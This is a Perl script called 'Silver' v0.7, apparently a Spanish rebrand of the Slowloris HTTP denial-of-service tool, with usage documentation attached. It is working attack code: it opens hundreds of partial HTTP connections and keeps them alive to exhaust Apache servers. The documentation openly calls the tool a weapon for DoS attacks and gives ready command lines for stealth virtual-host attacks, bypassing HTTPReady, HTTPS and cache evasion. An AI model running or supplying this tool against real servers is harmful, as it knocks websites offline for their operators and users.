#!/usr/bin/perl -w
use strict;
use IO::Socket::INET;
use IO::Socket::SSL;
use Getopt::Long;
use Config;

$SIG{'PIPE'} = 'IGNORE';    #Ignore broken pipe errors

print <<EOTEXT;
   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   %%                      |                UDP&TCP FLOOD ATTACK           %%
   %%                      |         Massive Atack denial of service       %%
   %%                      |           |use at your own risk|              %%
   %%                      |                                               %%
   %%                      ================================================%%
   ##                                                                      ##
   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%



my ( $host, $port, $sendhost, $shost, $test, $version, $timeout, $connections );
my ( $cache, $httpready, $method, $ssl, $rand, $tcpto );
my $result = GetOptions(
    'shost=s'   => \$shost,
    'dns=s'     => \$host,
    'httpready' => \$httpready,
    'num=i'     => \$connections,
    'cache'     => \$cache,
    'port=i'    => \$port,
    'https'     => \$ssl,
    'tcpto=i'   => \$tcpto,
    'test'      => \$test,
    'timeout=i' => \$timeout,
    'version'   => \$version,
);

if ($version) {
    print "Version 0.7\n";
    exit;
}

unless ($host) {
    print "Modo de uso:\n\n\tperl $0 -dns [www.ejemplo.com] -options\n";
    print "\n\tEscrive 'perldoc $0' para ayuda con opsiones.\n\n";
    exit;
}

unless ($port) {
    $port = 80;
    print "Defaulting to port 80.\n";
}

unless ($tcpto) {
    $tcpto = 5;
    print "Defaulting to a 5 second tcp connection timeout.\n";
}

unless ($test) {
    unless ($timeout) {
        $timeout = 100;
        print "Defaulting to a 100 second re-try timeout.\n";
    }
    unless ($connections) {
        $connections = 1000;
        print "Defaulting to 1000 connections.\n";
    }
}

my $usemultithreading = 0;
if ( $Config{usethreads} ) {
    print "Multiatack activo.\n";
    $usemultithreading = 1;
    use threads;
    use threads::shared;
}
else {
    print "No hay multiples capabilidades encontradas!\n";
    print "El atackes estara lento mas de lo nornal.\n";
}

my $packetcount : shared     = 0;
my $failed : shared          = 0;
my $connectioncount : shared = 0;

srand() if ($cache);

if ($shost) {
    $sendhost = $shost;
}
else {
    $sendhost = $host;
}
if ($httpready) {
    $method = "POST";
}
else {
    $method = "GET";
}

if ($test) {
    my @times = ( "2", "30", "90", "240", "500" );
    my $totaltime = 0;
    foreach (@times) {
        $totaltime = $totaltime + $_;
    }
    $totaltime = $totaltime / 60;
    print "This test could take up to $totaltime minutes.\n";

    my $delay   = 0;
    my $working = 0;
    my $sock;

    if ($ssl) {
        if (
            $sock = new IO::Socket::SSL(
                PeerAddr => "$host",
                PeerPort => "$port",
                Timeout  => "$tcpto",
                Proto    => "tcp",
            )
          )
        {
            $working = 1;
        }
    }
    else {
        if (
            $sock = new IO::Socket::INET(
                PeerAddr => "$host",
                PeerPort => "$port",
                Timeout  => "$tcpto",
                Proto    => "tcp",
            )
          )
        {
            $working = 1;
        }
    }
    if ($working) {
        if ($cache) {
            $rand = "?" . int( rand(99999999999999) );
        }
        else {
            $rand = "";
        }
        my $primarypayload =
            "GET /$rand HTTP/1.1\r\n"
          . "Host: $sendhost\r\n"
          . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
          . "Content-Length: 42\r\n";
        if ( print $sock $primarypayload ) {
            print "Conecion completada, ahora biene el tiempo de juego...\n";
        }
        else {
            print
"Eso es odd - I conectado pero no puede enviar los pacetes a el $host:$port.\n";
            print "Algo esta mal?\nDying.\n";
            exit;
        }
    }
    else {
        print "Uhm.. no me puedo conectar ah $host:$port.\n";
        print "Esta algo mal?\nDying.\n";
        exit;
    }
    for ( my $i = 0 ; $i <= $#times ; $i++ ) {
        print "Intentando a $times[$i] second delay: \n";
        sleep( $times[$i] );
        if ( print $sock "X-a: b\r\n" ) {
            print "\tWorked.\n";
            $delay = $times[$i];
        }
        else {
            if ( $SIG{__WARN__} ) {
                $delay = $times[ $i - 1 ];
                last;
            }
            print "\tFallido Despues $times[$i] segundos.\n";
        }
    }

    if ( print $sock "Connecsion: Cerrada\r\n\r\n" ) {
        print "eso es mucho tiempo. Se cerraron los sockets.\n";
        print "Usa $delay seconds para -timeout.\n";
        exit;
    }
    else {
        print "servidor remoto cerro los sockets.\n";
        print "Usa $delay seconds para -timeout.\n";
        exit;
    }
    if ( $delay < 166 ) {
        print <<EOSUCKS2BU;
Como o tempo de espera acabou sendo tão pequeno ($delay segundos) e normalmente
  leva entre 200-500 threads para a maioria dos servidores e assumindo que não há latência no
  tudo... você pode ter problemas para usar o Slowloris contra esse alvo. Você pode
  definir o tempo limite do sinalizador para menos de 10 segundos, mas ainda não é possível
  construção de planos ao longo do tempo.
EOSUCKS2BU
    }
}
else {
    print
"Conectando ah $host:$port cada $timeout segundos con $connections sockets:\n";

    if ($usemultithreading) {
        domultithreading($connections);
    }
    else {
        doconnections( $connections, $usemultithreading );
    }
}

sub doconnections {
    my ( $num, $usemultithreading ) = @_;
    my ( @first, @sock, @working );
    my $failedconnections = 0;
    $working[$_] = 0 foreach ( 1 .. $num );    #initializing
    $first[$_]   = 0 foreach ( 1 .. $num );    #initializing
    while (1) {
        $failedconnections = 0;
        print "\t\tCreando sockets.\n";
        foreach my $z ( 1 .. $num ) {
            if ( $working[$z] == 0 ) {
                if ($ssl) {
                    if (
                        $sock[$z] = new IO::Socket::SSL(
                            PeerAddr => "$host",
                            PeerPort => "$port",
                            Timeout  => "$tcpto",
                            Proto    => "tcp",
                        )
                      )
                    {
                        $working[$z] = 1;
                    }
                    else {
                        $working[$z] = 0;
                    }
                }
                else {
                    if (
                        $sock[$z] = new IO::Socket::INET(
                            PeerAddr => "$host",
                            PeerPort => "$port",
                            Timeout  => "$tcpto",
                            Proto    => "tcp",
                        )
                      )
                    {
                        $working[$z] = 1;
                        $packetcount = $packetcount + 3;  #SYN, SYN+ACK, ACK
                    }
                    else {
                        $working[$z] = 0;
                    }
                }
                if ( $working[$z] == 1 ) {
                    if ($cache) {
                        $rand = "?" . int( rand(99999999999999) );
                    }
                    else {
                        $rand = "";
                    }
                    my $primarypayload =
                        "$method /$rand HTTP/1.1\r\n"
                      . "Host: $sendhost\r\n"
                      . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
                      . "Content-Length: 42\r\n";
                    my $handle = $sock[$z];
                    if ($handle) {
                        print $handle "$primarypayload";
                        if ( $SIG{__WARN__} ) {
                            $working[$z] = 0;
                            close $handle;
                            $failed++;
                            $failedconnections++;
                        }
                        else {
                            $packetcount++;
                            $working[$z] = 1;
                        }
                    }
                    else {
                        $working[$z] = 0;
                        $failed++;
                        $failedconnections++;
                    }
                }
                else {
                    $working[$z] = 0;
                    $failed++;
                    $failedconnections++;
                }
            }
        }
        print "\t\tSending data.\n";
        foreach my $z ( 1 .. $num ) {
            if ( $working[$z] == 1 ) {
                if ( $sock[$z] ) {
                    my $handle = $sock[$z];
                    if ( print $handle "X-a: b\r\n" ) {
                        $working[$z] = 1;
                        $packetcount++;
                    }
                    else {
                        $working[$z] = 0;
                        #debugging info
                        $failed++;
                        $failedconnections++;
                    }
                }
                else {
                    $working[$z] = 0;
                    #debugging info
                    $failed++;
                    $failedconnections++;
                }
            }
        }
        print
"Current stats:\tSilverAtack 0.7 ah enviado ahora $packetcount packetes correctamente.\nEste thread ahora espera por $timeout seconds...\n\n";
        sleep($timeout);
    }
}

sub domultithreading {
    my ($num) = @_;
    my @thrs;
    my $i                    = 0;
    my $connectionsperthread = 50;
    while ( $i < $num ) {
        $thrs[$i] =
          threads->create( \&doconnections, $connectionsperthread, 1 );
        $i += $connectionsperthread;
    }
    my @threadslist = threads->list();
    while ( $#threadslist > 0 ) {
        $failed = 0;
    }
}

__END__

=head1 TITULO

Silver

=head1 VERSION

Version 0.7 

=head1 FECHA

07/03/2012

=head1 AUTOR

EVERYONE WHO GOT THIS

=head1 ABSTRACT

Este atacke no se hace reponsable por los actos que realize ya que es una arma para realizar atackes dos no para hacer juegos.  si usas este atacks aceptas automaticamente las consecuensias tu te aces responsable de tus actos :)

=head1 AFFECTADOS

Apache 1.x, Apache 2.x, dhttpd.

=head1 NOT AFFECTEDOS

IIS6.0, IIS7.0, lighttpd, nginx, Cherokee, Squid.

=head1 DESCRIPTION
Este es un massivo atacke dedicado y extrictamente echo para hacer atace dos . denial of service una vez que tu tengas el archivo en tus manos te aces responsable de los da�os que puedas causar :)

tanto los da�os de el atackante como los de el atackado seran cargos a ustedes no culpeis a los autores de dicho programa ya que no se isieron con esa finalidad 
=head2 pruevas

Si los tiempos fuera estan desconosidos , te mostrara un modo de ayuda y empesaras a provarlo:

=head3 Ejemplo de prueva:

./silver.pl -dns www.unejemplo.com -port 80 -test

Esto no le dar� un n�mero perfecto, pero debe darle una conjetura bastante buena en cuanto a d�nde disparar. Si usted realmente tiene que saber el n�mero exacto, puede que quiera meterse con la matriz @ tiempos (aunque yo no dir�a que a menos que sepas lo que est�s haciendo).

=head2 HTTP DoS

Una vez que encuentre una ventana de tiempo de espera, usted puede sintonizar Silver usar ciertas ventanas de tiempo de espera. Por ejemplo, si usted sabe que el servidor tiene un tiempo de espera de 3.000 segundos, pero la conexi�n est� latente la justa es posible que desee tomar el tiempo de espera de la ventana de 2000 segundos y aumentar el tiempo de espera de TCP a 5 segundos. El siguiente ejemplo utiliza 500 tomas. La mayor�a de servidores Apache promedio, por ejemplo, tienden a caer hacia abajo entre 400-600 tomas con una configuraci�n por defecto. Algunos son menos de 300. Cuanto menor sea el tiempo de espera m�s r�pido se va a consumir todos los recursos disponibles como los otros conectores que est�n en uso est�n disponibles - esto ser�a resuelto por la rosca, pero eso es para una futura revisi�n. Cuanto m�s cerca se puede llegar al n�mero exacto de tomas, mejor, porque eso reducir� la cantidad de intentos (y ancho de banda asociado) que silver har� para tener �xito. silverno tiene manera de identificar si es exitoso o no, sin embargo.

=head3 HTTP DoS Ejemplo:

./silver.pl -dns www.example.com -port 80 -timeout 2000 -num 500 -tcpto 5

=head2 HTTPReady Bypass

Httpready s�lo sigue ciertas reglas para con un interruptor de Silver puede pasar por alto httpready enviando el ataque como un post de los versos de una solicitud get o head con el interruptor-httpready.

=head3 HTTPReady Bypass Ejemplo

./silver.pl -dns www.example.com -port 80 -timeout 2000 -num 500 -tcpto 5 -httpready

=head2 Sigilo Host DoS

Si usted sabe que el servidor tiene m�ltiples servidores web que se ejecutan en m�quinas virtuales en, puede enviar el ataque a un host independiente virtual utilizando la variable shost. De esta manera los registros que se crean se van a otro archivo de registro virtual de acogida, pero s�lo si se mantienen por separado.

=head3 Sigilo Host DoS Ejemplo:

./silver.pl -dns www.ejemplo.com -port 80 -timeout 30 -num 500 -tcpto 1 -shost www.virtualhost.com

=head2 HTTPS DoS

Silver es compatible con SSL / TLS, con car�cter experimental con el modificador-https. La utilidad de esta opci�n en particular no ha sido probado a fondo, y de hecho no ha demostrado ser especialmente eficaz en las pruebas de muy pocos que se realizan durante las primeras fases de desarrollo. Su kilometraje puede variar

=head3 HTTPS DoS Ejemplo:

./silver.pl -dns www.ejemplo.com -port 443 -timeout 30 -num 500 -https

=head2 HTTP Cache

Silver hace evitar el soporte de cache, con car�cter experimental con el interruptor de la memoria cach�. Algunos servidores de almacenamiento en cach� puede verse en la parte de la ruta de la solicitud de la cabecera, sino por el env�o de solicitudes diferentes cada vez que pueden abusar de m�s recursos. La utilidad de esta opci�n en particular no ha sido probado a fondo. Su kilometraje puede variar.

=head3 HTTP Cache Ejemplo:

./silver.pl -dns www.ejemplo.com -port 80 -timeout 30 -num 500 -cache

